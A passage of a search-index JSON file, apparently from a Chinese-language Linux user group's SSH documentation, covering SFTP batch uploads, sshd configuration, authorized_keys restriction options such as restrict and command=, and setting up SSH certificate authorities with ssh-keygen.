directory-name</code>\uff1a\u200b\u6539\u53d8\u200b\u672c\u5730\u200b\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u3002</li> </ul>"},{"location":"dev/ssh/#exit-sftp","title":"\u9000\u51fa\u200b SFTP \u200b\u4f1a\u8bdd","text":"<p>\u200b\u8f93\u5165\u200b <code>exit</code> \u200b\u6216\u200b <code>bye</code> \u200b\u6765\u200b\u7ec8\u6b62\u200b SFTP \u200b\u4f1a\u8bdd\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u811a\u672c\u200b\u8fdb\u884c\u200b\u81ea\u52a8\u5316\u200b\u64cd\u4f5c\u200b</p> <p>\u200b\u901a\u8fc7\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u5305\u542b\u200b SFTP \u200b\u547d\u4ee4\u200b\u7684\u200b\u6279\u5904\u7406\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b \u200b\u8ba9\u200bSFTP \u200b\u4f1a\u8bdd\u200b\u81ea\u52a8\u200b\u6267\u884c\u200b\u8fd9\u4e9b\u200b\u547d\u4ee4\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b <code>upload.txt</code>\uff0c\u200b\u5176\u4e2d\u200b\u5305\u542b\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\uff1a</p> <p><pre><code>put file1.txt\nput file2.jpg\nput file3.pdf\nquit\n</code></pre> \u200b\u7136\u540e\u200b\u4f7f\u7528\u200b\u547d\u4ee4\u200b <code>sftp -b upload.txt username@remotehost</code> \u200b\u6765\u200b\u81ea\u52a8\u200b\u4e0a\u4f20\u200b\u6587\u4ef6\u200b\u3002</p>"},{"location":"dev/ssh/#sshd-config","title":"\u670d\u52a1\u7aef\u200b\u914d\u7f6e","text":"<p>\u200b\u670d\u52a1\u7aef\u200b\u7684\u200b\u914d\u7f6e\u200b\u4e0e\u200b\u5ba2\u6237\u7aef\u200b\u6709\u200b\u4e00\u4e9b\u200b\u4e0d\u540c\u70b9\u200b\uff1a</p> <ul> <li>sshd \u200b\u670d\u52a1\u7aef\u200b\u7a0b\u5e8f\u200b\u53ea\u6709\u200b\u5f88\u200b\u5c11\u91cf\u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u53c2\u6570\u200b\uff0c\u200b\u5404\u79cd\u200b\u914d\u7f6e\u200b\u90fd\u200b\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u5b8c\u6210\u200b\u3002\u200b\u7279\u522b\u200b\u6ce8\u610f\u200b\uff0csshd \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e0d\u662f\u200b\u53ef\u9009\u200b\u7684\u200b\uff1a\u200b\u5982\u679c\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e0d\u200b\u5b58\u5728\u200b\u6216\u8005\u200b\u5305\u542b\u200b\u9519\u8bef\u200b\uff0csshd \u200b\u4f1a\u200b\u62d2\u7edd\u200b\u542f\u52a8\u200b\u3002</li> <li>sshd \u200b\u4ec5\u200b\u6709\u200b\u4e00\u4e2a\u200b\u914d\u7f6e\u6587\u4ef6\u200b <code>/etc/ssh/sshd_config</code>\uff0c\u200b\u5b83\u200b\u7684\u200b\u914d\u7f6e\u200b\u9879\u200b\u53ef\u4ee5\u200b\u5728\u200b sshd_config(5) \u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</li> </ul> <p>sshd \u200b\u63a5\u53d7\u200b SIGHUP \u200b\u4fe1\u53f7\u200b\u4f5c\u4e3a\u200b\u91cd\u65b0\u200b\u8f7d\u5165\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u65b9\u5f0f\u200b\u3002<code>sshd -t</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u68c0\u67e5\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u8bed\u6cd5\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b\u5927\u591a\u6570\u200b\u53d1\u884c\u7248\u200b\u63d0\u4f9b\u200b\u7684\u200b <code>ssh.service</code> \u200b\u4e2d\u200b\u6307\u5b9a\u200b\u7684\u200b <code>ExecStartPre=</code> \u200b\u547d\u4ee4\u200b\u548c\u200b\u7b2c\u4e00\u6761\u200b <code>ExecReload=</code> \u200b\u547d\u4ee4\u200b\uff0c\u200b\u5373\u200b\u5728\u200b\u5c1d\u8bd5\u200b\u542f\u52a8\u200b\u548c\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u670d\u52a1\u200b\u524d\u5148\u200b\u68c0\u67e5\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u8bed\u6cd5\u200b\u3002</p>"},{"location":"dev/ssh/#authorized-keys","title":"authorized_keys \u200b\u6587\u4ef6","text":"<p><code>~/.ssh/authorized_keys</code> \u200b\u6587\u4ef6\u200b\u662f\u200b SSH \u200b\u670d\u52a1\u7aef\u200b\u7528\u4e8e\u200b\u9a8c\u8bc1\u200b\u5ba2\u6237\u7aef\u200b\u516c\u94a5\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6bcf\u884c\u200b\u4e00\u4e2a\u200b\u516c\u94a5\u200b\uff0c\u200b\u7a7a\u884c\u200b\u6216\u8005\u200b\u4ee5\u200b <code>#</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u884c\u4f1a\u200b\u88ab\u200b\u5f53\u4f5c\u200b\u6ce8\u91ca\u200b\u5ffd\u7565\u200b\u3002</p> <p><code>authorized_keys</code> \u200b\u6587\u4ef6\u200b\u8fd8\u200b\u5141\u8bb8\u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u516c\u94a5\u200b\u6307\u5b9a\u200b\u4e00\u4e9b\u200b\u9009\u9879\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <code>from=\"192.0.2.0/24,2001:db8::/32\"</code> <p>\u200b\u9650\u5236\u200b\u6b64\u516c\u200b\u94a5\u200b\u53ea\u80fd\u200b\u4ece\u200b\u6307\u5b9a\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u8fde\u63a5\u200b\u3002</p> <code>expiry-time=\"197001010800Z\"</code> <p>\u200b\u9650\u5236\u200b\u6b64\u516c\u200b\u94a5\u200b\u7684\u200b\u6709\u6548\u200b\u65f6\u95f4\u200b\uff0c\u200b\u683c\u5f0f\u200b\u4e3a\u200b <code>YYYYMMDDhhmm</code>\uff08\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u672c\u5730\u200b\u65f6\u95f4\u200b\uff09\uff0c\u200b\u6216\u8005\u200b\u5728\u200b\u5176\u540e\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u5927\u5199\u5b57\u6bcd\u200b Z \u200b\u8868\u793a\u200b UTC \u200b\u65f6\u95f4\u200b\u3002\u200b\u9002\u5408\u200b\u7528\u4e8e\u200b\u6dfb\u52a0\u200b\u4e34\u65f6\u200b\u7528\u9014\u200b\u7684\u200b\u516c\u94a5\u200b\uff0c\u200b\u786e\u4fdd\u200b\u5373\u4f7f\u200b\u4e8b\u540e\u200b\u5fd8\u8bb0\u200b\u5220\u9664\u200b\u4e86\u200b\uff0c\u200b\u5b83\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u8d85\u671f\u200b\u751f\u6548\u200b\u3002</p> <code>command=\"/path/to/command\"</code> <p>\u200b\u9650\u5236\u200b\u6b64\u516c\u200b\u94a5\u200b\u53ea\u80fd\u200b\u7528\u4e8e\u200b\u6267\u884c\u200b\u6307\u5b9a\u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u4e14\u200b\u4e0d\u80fd\u200b\u767b\u5f55\u200b shell\u3002\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u6b64\u516c\u200b\u94a5\u200b\u767b\u5f55\u200b\u65f6\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u989d\u5916\u200b\u7684\u200b\u547d\u4ee4\u200b\uff08\u200b\u4f8b\u5982\u200b <code>ssh user@host some/other/command</code>\uff09\uff0c\u200b\u63d0\u4f9b\u200b\u7684\u200b\u547d\u4ee4\u200b\u5c06\u4f1a\u200b\u5728\u200b <code>SSH_ORIGINAL_COMMAND</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\u4e2d\u200b\u4f20\u9012\u200b\u7ed9\u200b\u6307\u5b9a\u200b\u7684\u200b\u547d\u4ee4\u200b\u3002</p> <p>\u200b\u6307\u5b9a\u200b\u547d\u4ee4\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5e38\u7528\u200b\u573a\u666f\u200b\u662f\u200b\u4e3a\u200b\u5907\u4efd\u200b\u670d\u52a1\u200b\u63d0\u4f9b\u200b\u6709\u9650\u200b\u7684\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>command=\"/usr/bin/rrsync /path/to/backup\"</code>\uff0c\u200b\u8fd9\u6837\u200b\u5907\u4efd\u200b\u670d\u52a1\u200b\u5c31\u200b\u53ea\u80fd\u200b\u4f7f\u7528\u200b rsync \u200b\u547d\u4ee4\u200b\u8bbf\u95ee\u200b\u6307\u5b9a\u200b\u7684\u200b\u76ee\u5f55\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>command=</code> \u200b\u7684\u8bdd\u200b\uff0c\u200b\u4f60\u200b\u5f88\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u9700\u8981\u200b <code>restrict</code>\uff08\u200b\u89c1\u200b\u4e0b\u200b\uff09\u3002</p> <code>no-port-forwarding</code>, <code>no-X11-forwarding</code>, <code>no-agent-forwarding</code>, <code>no-pty</code>, <code>no-user-rc</code> <p>\u200b\u7981\u6b62\u200b\u5bf9\u5e94\u200b\u7684\u200b\u529f\u80fd\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u9650\u5236\u200b\u516c\u94a5\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7981\u6b62\u200b\u5404\u79cd\u200b\u8f6c\u53d1\u200b\u548c\u200b\u4f7f\u7528\u200b\u7ec8\u7aef\u200b\u7b49\u200b\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u7981\u6b62\u200b TCP \u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u4e4b\u540e\u200b\uff0c\u200b\u8be5\u516c\u94a5\u200b\u4e5f\u200b\u4e0d\u80fd\u200b\u7528\u4e8e\u200b\u5c06\u200b\u672c\u673a\u200b\u4f5c\u4e3a\u200b\u8df3\u677f\u200b\u673a\u200b\u767b\u5f55\u200b\u5176\u4ed6\u200b\u673a\u5668\u200b\uff08\u200b\u5373\u200b <code>-J</code> \u200b\u53c2\u6570\u200b\u6216\u200b <code>ProxyJump</code> \u200b\u914d\u7f6e\u200b\u9879\u200b\uff09\u3002</p> <code>restrict</code> <p>\u200b\u7981\u6b62\u200b\u6240\u6709\u200b\u53ef\u200b\u9009\u200b\u529f\u80fd\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b\u4e0a\u200b\u4e00\u6761\u200b\u5217\u51fa\u200b\u7684\u200b\uff08\u200b\u548c\u200b\u6ca1\u200b\u5217\u51fa\u200b\u7684\u200b\uff0c\u200b\u8be6\u60c5\u200b\u89c1\u200b man page\uff09\u200b\u6240\u6709\u200b\u9009\u9879\u200b\u3002</p> <p>\u200b\u901a\u5e38\u200b\u4e0e\u200b <code>command=</code> \u200b\u642d\u914d\u200b\u4f7f\u7528\u200b\uff0c\u200b\u786e\u4fdd\u200b\u6307\u5b9a\u200b\u516c\u94a5\u200b\u53ea\u80fd\u200b\u505a\u200b\u6307\u5b9a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5728\u200b <code>restrict</code> \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u5355\u72ec\u200b\u5f00\u653e\u200b\u67d0\u4e9b\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>port-forwarding</code> \u200b\u7b49\u200b\uff08\u200b\u4e5f\u200b\u5c31\u662f\u200b\u53bb\u6389\u200b\u524d\u9762\u200b\u7684\u200b <code>no-</code>\uff09\u3002</p> <p>\u200b\u5b8c\u6574\u200b\u7684\u200b\u9009\u9879\u200b\u5217\u8868\u200b\u53ef\u4ee5\u200b\u5728\u200b sshd(8) \u200b\u7684\u200b <code>AUTHORIZED_KEYS FILE FORMAT</code> \u200b\u90e8\u5206\u200b\u627e\u5230\u200b\u3002</p> \u200b\u4f8b\u200b\uff1a\u200b\u7528\u4e8e\u200b\u5907\u4efd\u200b LUG FTP \u200b\u7684\u200b\u516c\u94a5\u200b\u914d\u7f6e\u200b <pre><code>restrict,from=\"192.0.2.2\",command=\"/usr/bin/rrsync -ro /mnt/lugftp\" ssh-rsa ...\n</code></pre>"},{"location":"dev/ssh/#certificates","title":"SSH \u200b\u8bc1\u4e66","text":"<p>OpenSSH \u200b\u652f\u6301\u200b\u4f7f\u7528\u200b\u8bc1\u4e66\u200b\u4f5c\u4e3a\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u7aef\u200b\u7684\u200b\u8eab\u4efd\u9a8c\u8bc1\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5373\u200b\u5728\u200b\u6b63\u786e\u200b\u914d\u7f6e\u200b\u4e86\u200b\u8bc1\u4e66\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u65e0\u9700\u200b\u9884\u5148\u200b\u8bb0\u5f55\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u516c\u94a5\u200b\uff08\u200b\u5373\u200b\u52a0\u5165\u200b <code>known_hosts</code> \u200b\u6587\u4ef6\u200b\uff09\u200b\u5373\u53ef\u200b\u4fe1\u4efb\u200b SSH \u200b\u670d\u52a1\u7aef\u200b\uff0c\u200b\u800c\u200b\u670d\u52a1\u7aef\u200b\u4e5f\u200b\u65e0\u9700\u200b\u9884\u5148\u200b\u8bb0\u5f55\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u516c\u94a5\u200b\uff08\u200b\u5373\u200b\u5199\u5165\u200b\u5bf9\u5e94\u200b\u7528\u6237\u200b\u7684\u200b <code>authorized_keys</code> \u200b\u6587\u4ef6\u200b\uff09\u200b\u5373\u53ef\u200b\u786e\u8ba4\u200b\u767b\u5f55\u200b\u8005\u200b\u7684\u200b\u8eab\u4efd\u200b\u3002\u200b\u4f7f\u7528\u200b\u8bc1\u4e66\u200b\u8fdb\u884c\u200b SSH \u200b\u8eab\u4efd\u9a8c\u8bc1\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u597d\u5904\u200b\uff1a</p> <ul> <li> <p>\u200b\u5bf9\u4e8e\u200b\u670d\u52a1\u5668\u200b\u548c\u200b\u5ba2\u6237\u7aef\u200b\uff08\u200b\u6216\u200b\u7528\u6237\u200b\uff09\u200b\u6570\u91cf\u200b\u8f83\u200b\u591a\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u901a\u8fc7\u200b\u7b7e\u7f72\u200b\u8bc1\u4e66\u200b\u7684\u200b\u65b9\u5f0f\u200b\u53ef\u4ee5\u200b\u5927\u5927\u964d\u4f4e\u200b\u914d\u7f6e\u200b\u590d\u6742\u5ea6\u200b\uff0c\u200b\u4e14\u200b\u5bb9\u6613\u200b\u7ba1\u7406\u200b\u767b\u5f55\u200b\u6388\u6743\u200b\u7684\u200b\u5206\u914d\u60c5\u51b5\u200b\u3002</p> <ul> <li> <p>\u200b\u5982\u679c\u200b\u5ba2\u6237\u7aef\u200b\u88ab\u200b\u5141\u8bb8\u200b\u81ea\u884c\u200b\u4fee\u6539\u200b <code>authorized_keys</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5219\u200b\u5176\u200b\u4ecd\u7136\u200b\u80fd\u591f\u200b\u6dfb\u52a0\u200b\u5176\u4ed6\u200b\u516c\u94a5\u200b\u7528\u4e8e\u200b\u767b\u5f55\u200b\u5df2\u200b\u6388\u6743\u200b\u7684\u200b\u670d\u52a1\u7aef\u200b\uff0c\u200b\u7ed5\u8fc7\u200b\u91c7\u7528\u200b\u8bc1\u4e66\u200b\u8ba4\u8bc1\u200b\u7684\u200b\u7ba1\u7406\u200b\u76ee\u7684\u200b\u3002\u200b\u8bf7\u200b\u6839\u636e\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u51b3\u5b9a\u200b\u662f\u5426\u200b\u9700\u8981\u200b\u7981\u6b62\u200b\u5ba2\u6237\u7aef\u200b\u81ea\u884c\u200b\u4fee\u6539\u200b <code>authorized_keys</code> \u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u63d0\u793a\u200b\uff1aSSH \u200b\u670d\u52a1\u7aef\u200b\u5177\u6709\u200b <code>AuthorizedKeysFile</code> \u200b\u8bbe\u7f6e\u200b\u9879\u200b\uff0c\u200b\u5176\u200b\u9ed8\u8ba4\u503c\u200b\u4e3a\u200b <code>.ssh/authorized_keys</code>\u3002</p> </li> </ul> </li> <li> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cSSH \u200b\u670d\u52a1\u7aef\u200b\u4f1a\u200b\u5728\u200b\u65e5\u5fd7\u200b\u4e2d\u200b\u8bb0\u5f55\u200b\u767b\u5f55\u200b\u65f6\u200b\u6240\u7528\u200b\u7684\u200b\u8bc1\u4e66\u200b\u7684\u200b\u201c\u200b\u4e3b\u4f53\u200b\u201d\u200b\u4e0e\u200b\u7f16\u53f7\u200b\uff0c\u200b\u5373\u200b\u7b7e\u53d1\u200b\u8bc1\u4e66\u200b\u65f6\u200b <code>-I</code> \u200b\u4e0e\u200b <code>-z</code> \u200b\u53c2\u6570\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fd9\u200b\u4f7f\u5f97\u200b\u7ba1\u7406\u5458\u200b\u80fd\u591f\u200b\u66f4\u200b\u65b9\u4fbf\u200b\u5730\u200b\u8ffd\u8e2a\u200b\u5ba2\u6237\u7aef\u200b\u5bc6\u94a5\u200b\u5bf9\u200b\u7684\u200b\u4f7f\u7528\u200b\u60c5\u51b5\u200b\u3002</p> </li> <li>\u200b\u76f8\u6bd4\u200b\u4e8e\u200b <code>authorized_keys</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u7b7e\u53d1\u200b\u8bc1\u4e66\u200b\u65f6\u200b\u80fd\u591f\u200b\u66f4\u200b\u65b9\u4fbf\u200b\u5730\u200b\u6307\u5b9a\u200b\u4e00\u4e9b\u200b\u4e0e\u200b\u516c\u94a5\u200b\u76f8\u5173\u200b\u7684\u200b\u53c2\u6570\u200b\uff0c\u200b\u5982\u200b\u6709\u6548\u671f\u200b\uff08<code>-V</code> \u200b\u53c2\u6570\u200b\uff09\u200b\u7b49\u200b\u3002</li> <li>\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u4f7f\u7528\u200b\u79c1\u94a5\u200b\u767b\u5f55\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u7b7e\u53d1\u200b\u8bc1\u4e66\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u53ef\u4ee5\u200b\u79bb\u7ebf\u200b\u8fdb\u884c\u200b\uff0c\u200b\u63d0\u5347\u200b CA \u200b\u79c1\u94a5\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\u3002</li> </ul> <p>\u200b\u4f7f\u7528\u200b\u8bc1\u4e66\u200b\u8ba4\u8bc1\u200b\u65b9\u6848\u200b\u65f6\u200b\u7684\u200b\u6ce8\u610f\u4e8b\u9879\u200b\uff1a</p> <ul> <li>SSH \u200b\u8bc1\u4e66\u200b\u6ca1\u6709\u200b X.509 \u200b\u8bc1\u4e66\u200b\u7684\u200b\u94fe\u5f0f\u200b\u7ed3\u6784\u200b\uff0c\u200b\u5373\u200b SSH \u200b\u8bc1\u4e66\u200b\u6ca1\u6709\u200b\u201c\u200b\u4e2d\u95f4\u200b CA\u201d\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0cCA \u200b\u7684\u200b\u8eab\u4efd\u200b\u7531\u516c\u94a5\u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6240\u6709\u200b\u7684\u200b CA \u200b\u90fd\u200b\u662f\u200b\u6839\u200b CA\u3002\u200b\u4e00\u65e6\u200b CA \u200b\u7684\u200b\u79c1\u94a5\u200b\u53d1\u751f\u200b\u6cc4\u9732\u200b\uff0c\u200b\u9700\u8981\u200b\u7acb\u523b\u200b\u5728\u200b\u6240\u6709\u200b\u673a\u5668\u200b\u4e0a\u200b\u5220\u9664\u200b\u5bf9\u5e94\u200b\u7684\u200b CA \u200b\u516c\u94a5\u200b\u914d\u7f6e\u200b\u3002\u200b\u8fd9\u200b\u5bf9\u200b SSH CA \u200b\u7684\u200b\u5bc6\u94a5\u200b\u7ba1\u7406\u200b\u63d0\u51fa\u200b\u4e86\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u8981\u6c42\u200b\u3002</li> <li> <p>SSH \u200b\u8bc1\u4e66\u200b\u6ca1\u6709\u200b\u81ea\u52a8\u66f4\u65b0\u200b CRL \u200b\u7684\u200b\u673a\u5236\u200b\uff0c\u200b\u8bc1\u4e66\u200b\u7684\u200b\u64a4\u9500\u200b\u4f9d\u8d56\u4e8e\u200b\u7ba1\u7406\u5458\u200b\u81ea\u884c\u200b\u7ef4\u62a4\u200b\u201c\u200b\u516c\u94a5\u200b\u540a\u9500\u200b\u5217\u8868\u200b\u201d\uff08Key Revocation List\uff0cKRL\uff09\u200b\u6587\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u5df2\u200b\u83b7\u5f97\u200b\u7b7e\u53d1\u200b\u8bc1\u4e66\u200b\u7684\u200b\u5bf9\u5e94\u200b\u79c1\u94a5\u200b\u53d1\u751f\u200b\u6cc4\u9732\u200b\uff0c\u200b\u4e5f\u200b\u9700\u8981\u200b\u7ef4\u62a4\u200b KRL \u200b\u76f4\u5230\u200b\u5bf9\u5e94\u200b\u8bc1\u4e66\u200b\u8fc7\u671f\u200b\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u751f\u200b\u6cc4\u9732\u200b\u7684\u200b\u8bc1\u4e66\u200b\u672a\u200b\u8bbe\u7f6e\u200b\u6709\u6548\u671f\u200b\uff0c\u200b\u5219\u200b\u5176\u200b\u662f\u200b\u65e0\u9650\u671f\u200b\u6709\u6548\u200b\u7684\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5df2\u200b\u6cc4\u9732\u200b\u7684\u200b\u79c1\u94a5\u200b\u4e5f\u200b\u9700\u8981\u200b\u65e0\u9650\u671f\u200b\u5730\u200b\u8bb0\u5f55\u200b\u5728\u200b\u6240\u6709\u200b\u4fe1\u4efb\u200b\u6b64\u200b\u8bc1\u4e66\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u7684\u200b KRL \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5e26\u6765\u200b\u4e00\u5b9a\u200b\u7684\u200b\u7ba1\u7406\u8d1f\u62c5\u200b\u3002\u200b\u56e0\u6b64\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u4e3a\u200b\u6240\u6709\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u8bc1\u4e66\u200b\u6307\u5b9a\u200b\u6709\u6548\u671f\u200b\uff0c\u200b\u4ece\u4e0d\u200b\u7b7e\u53d1\u200b\u65e0\u9650\u671f\u200b\u6709\u6548\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u8bc1\u4e66\u200b\u3002</p> </li> </ul> <p>\u200b\u603b\u7684\u6765\u8bf4\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u4e2d\u200b\u5c0f\u89c4\u6a21\u200b\u7684\u200b\u793e\u56e2\u200b\u548c\u200b\u5b9e\u9a8c\u5ba4\u200b\u670d\u52a1\u5668\u200b\u7ba1\u7406\u200b\u573a\u666f\u200b\uff0c\uff08\u200b\u5bf9\u200b\u7ba1\u7406\u5458\u200b\uff09\u200b\u4f7f\u7528\u200b SSH \u200b\u8bc1\u4e66\u200b\u8ba4\u8bc1\u200b\u662f\u200b\u4e2a\u200b\u8f83\u4e3a\u200b\u65b9\u4fbf\u200b\u6613\u7528\u200b\u7684\u200b\u65b9\u5f0f\u200b\u3002</p> <p>\u200b\u4e0e\u200b X.509 \u200b\u8bc1\u4e66\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u901a\u8fc7\u200b\u8bc1\u4e66\u200b\u4fe1\u4efb\u200b\u670d\u52a1\u7aef\u200b\u548c\u200b\u670d\u52a1\u7aef\u200b\u901a\u8fc7\u200b\u8bc1\u4e66\u200b\u8ba4\u8bc1\u200b\u5ba2\u6237\u7aef\u200b\u662f\u200b\u4e24\u4ef6\u200b\u72ec\u7acb\u200b\u7684\u200b\u4e8b\u200b\uff0c\u200b\u5728\u200b\u5b9e\u9645\u200b\u5e94\u7528\u200b\u4e2d\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u9700\u6c42\u200b\u4f7f\u7528\u200b\u540c\u4e00\u4e2a\u200b CA \u200b\u6216\u200b\u5206\u522b\u200b\u4f7f\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b CA\u3002</p>"},{"location":"dev/ssh/#ssh-ca","title":"\u521b\u5efa\u200b SSH CA","text":"<p>\u200b\u524d\u200b\u6587\u200b\u63d0\u5230\u200b\uff0cSSH CA \u200b\u7684\u200b\u8eab\u4efd\u200b\u7531\u516c\u94a5\u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u5bf9\u200b\u666e\u901a\u200b\u7684\u200b SSH \u200b\u5bc6\u94a5\u200b\u5bf9\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b SSH CA \u200b\u6240\u200b\u9700\u200b\u7684\u200b\u5168\u90e8\u5185\u5bb9\u200b\uff0c\u200b\u4e0d\u50cf\u200b X.509 \u200b\u9700\u8981\u200b\u518d\u8fdb\u4e00\u6b65\u200b\u4e3a\u6839\u200b CA \u200b\u4ea7\u751f\u200b\u4e00\u4e2a\u200b\u81ea\u200b\u7b7e\u540d\u200b\u8bc1\u4e66\u200b\u3002\u200b\u6b64\u5904\u200b\u5f15\u7528\u200b\u521b\u5efa\u200b SSH \u200b\u5bc6\u94a5\u200b\u5bf9\u200b\u7684\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>ssh-keygen -f my_ca [-t ed25519] [-C 'My CA'] [-N 'my-ca-p@ssw0rd']\n</code></pre> <p>\u200b\u6ce8\u610f\u200b\u5230\u200b\u5c3d\u7ba1\u200b <code>-t</code>\u3001<code>-C</code> \u200b\u548c\u200b <code>-N</code> \u200b\u53c2\u6570\u200b\u90fd\u200b\u662f\u200b\u53ef\u9009\u200b\u7684\u200b<sup>2</sup>\uff0c\u200b\u4e3a\u4e86\u200b\u4fbf\u4e8e\u200b\u8fa8\u8ba4\u200b CA \u200b\u548c\u200b\u63d0\u9ad8\u200b\u5b89\u5168\u6027\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f3a\u70c8\u5efa\u8bae\u200b\u91c7\u7528\u200b\u5148\u8fdb\u200b\u7684\u200b\u5bc6\u7801\u5b66\u200b\u7b97\u6cd5\u200b\uff08Ed25519\uff09\u3001\u200b\u6307\u5b9a\u200b\u53ef\u8bfb\u200b\u7684\u200b\u5907\u6ce8\u200b\u6587\u5b57\u200b\u548c\u200b\u4e3a\u200b\u79c1\u94a5\u200b\u8bbe\u7f6e\u200b\u5bc6\u7801\u200b\u3002</p> <p>\u200b\u751f\u6210\u200b\u5bc6\u94a5\u200b\u5bf9\u540e\u200b\uff0c\u200b\u8bf7\u200b\u4fdd\u7ba1\u200b\u597d\u200b <code>my_ca</code> \u200b\u79c1\u94a5\u200b\u6587\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u5373\u53ef\u200b\u5c06\u200b <code>my_ca.pub</code> \u200b\u516c\u94a5\u200b\u6587\u4ef6\u200b\u590d\u5236\u200b\u6216\u200b\u516c\u5f00\u200b\u4f20\u64ad\u200b\u4e86\u200b\u3002</p>"},{"location":"dev/ssh/#server-certificates","title":"\u670d\u52a1\u7aef\u200b\u8bc1\u4e66","text":"<p>\u200b\u9996\u5148\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u9700\u8981\u200b\u4fe1\u4efb\u200b CA \u200b\u7b7e\u53d1\u200b\u7684\u200b\u8bc1\u4e66\u200b\uff0c\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5728\u200b <code>known_hosts</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u52a0\u5165\u200b CA 